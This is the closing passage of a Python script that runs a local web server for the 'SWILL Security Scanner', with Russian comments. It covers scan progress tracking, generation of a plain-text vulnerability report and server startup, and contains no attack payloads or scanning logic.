            self.end_headers()
            self.wfile.write(json.dumps(response).encode('utf-8'))
            
        elif self.path == '/download':
            # Генерация отчета
            report = self.generate_text_report(data)
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.send_header('Content-Disposition', f'attachment; filename="security_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt"')
            self.end_headers()
            self.wfile.write(report.encode('utf-8'))
            
    def run_scan(self, target):
        """Запуск сканирования"""
        scanner = SecurityScanner(target)
        
        # Обновление прогресса
        self.scan_status = "Проверка доступности..."
        self.scan_progress = 10
        
        scanner.run_full_scan()
        
        self.scan_progress = 90
        self.scan_status = "Генерация отчета..."
        
        self.scan_results = scanner.generate_report()
        self.scan_logs = '<br>'.join(scanner.logs)
        
        self.scan_progress = 100
        self.scan_status = "Сканирование завершено"
        self.scanning = False
        
    def generate_text_report(self, data):
        """Генерация текстового отчета"""
        report = '=' * 60 + '\n'
        report += 'SWILL SECURITY SCAN REPORT\n'
        report += '=' * 60 + '\n\n'
        report += f"Дата сканирования: {data.get('date', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}\n"
        report += f"Цель: {data.get('target', 'N/A')}\n"
        report += f"Оценка безопасности: {data.get('score', 0)}/100\n\n"
        report += '-' * 60 + '\n'
        report += 'СТАТИСТИКА УЯЗВИМОСТЕЙ\n'
        report += '-' * 60 + '\n\n'
        report += f"Критических: {data.get('criticalCount', 0)}\n"
        report += f"Высоких: {data.get('highCount', 0)}\n"
        report += f"Средних: {data.get('mediumCount', 0)}\n"
        report += f"Низких: {data.get('lowCount', 0)}\n"
        report += f"Всего: {len(data.get('vulnerabilities', []))}\n\n"
        
        vulnerabilities = data.get('vulnerabilities', [])
        if vulnerabilities:
            report += '-' * 60 + '\n'
            report += 'НАЙДЕННЫЕ УЯЗВИМОСТИ\n'
            report += '-' * 60 + '\n\n'
            
            for i, vuln in enumerate(vulnerabilities, 1):
                report += f"{i}. {vuln.get('type', 'Unknown')}\n"
                report += f"   Severity: {vuln.get('severity', 'unknown').upper()}\n"
                report += f"   Description: {vuln.get('description', '')}\n"
                report += f"   Recommendation: {vuln.get('recommendation', '')}\n"
                if vuln.get('payload'):
                    report += f"   Payload: {vuln['payload']}\n"
                report += '\n'
        else:
            report += 'Уязвимостей не обнаружено.\n'
            
        report += '=' * 60 + '\n'
        report += 'Generated by SWILL Security Scanner\n'
        report += 'TG: t.me/Swill_Way\n'
        report += '=' * 60 + '\n'
        
        return report
        
    def log_message(self, format, *args):
        print(f"[SWILL] {args}")


def main():
    print("""
    ╔══════════════════════════════════════════╗
    ║     SWILL Security Scanner v1.0          ║
    ║     TG: t.me/Swill_Way                   ║
    ╚══════════════════════════════════════════╝
    """)
    
    print(f"[SWILL] Запуск сервера на http://{HOST}:{PORT}")
    print(f"[SWILL] Откройте браузер и перейдите по адресу")
    print(f"[SWILL] Нажмите Ctrl+C для остановки\n")
    
    try:
        with socketserver.ThreadingTCPServer((HOST, PORT), ScannerHandler) as httpd:
            print(f"[SWILL] Сервер запущен: http://{HOST}:{PORT}")
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[SWILL] Остановка сервера...")
    except OSError as e:
        if e.errno == 98:
            print(f"[ERROR] Порт {PORT} уже занят. Попробуйте другой порт.")
        else:
            print(f"[ERROR] {e}")


if __name__ == '__main__':
    main()
